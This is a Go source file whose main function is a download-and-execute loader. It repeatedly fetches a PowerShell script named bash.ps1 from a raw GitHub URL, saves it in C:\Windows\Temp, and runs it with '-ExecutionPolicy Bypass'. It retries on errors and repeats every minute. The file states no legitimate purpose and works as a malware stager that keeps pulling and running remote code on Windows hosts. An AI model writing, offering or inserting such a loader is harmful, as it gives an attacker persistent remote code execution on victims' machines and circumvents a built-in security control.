package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func main() {
	for {
		url := "https://raw.githubusercontent.com/HalfMalayHalfChinese/script/main/bash.ps1"

		// Download the script from GitHub
		resp, err := http.Get(url)
		if err != nil {
			log.Printf("Failed to download the script: %v\n", err)
			time.Sleep(10 * time.Second) // Retry after 10 seconds
			continue
		}
		defer resp.Body.Close()

		// Read the script content
		scriptBody, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Printf("Failed to read the script body: %v\n", err)
			time.Sleep(10 * time.Second) // Retry after 10 seconds
			continue
		}

		// Specify the temp file path in C:\Windows\Temp
		tmpFilePath := filepath.Join("C:\\Windows\\Temp", "bash.ps1")

		// Write the script content to the specified temp file
		err = ioutil.WriteFile(tmpFilePath, scriptBody, 0644)
		if err != nil {
			log.Printf("Failed to write to temp file: %v\n", err)
			time.Sleep(10 * time.Second) // Retry after 10 seconds
			continue
		}

		// Execute the downloaded PowerShell script
		cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", tmpFilePath)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		if err := cmd.Run(); err != nil {
			log.Printf("Failed to run the script: %v\n", err)
		} else {
			log.Printf("Script executed successfully\n")
		}

		// Wait for a minute before checking again
		time.Sleep(60 * time.Second)
	}
}
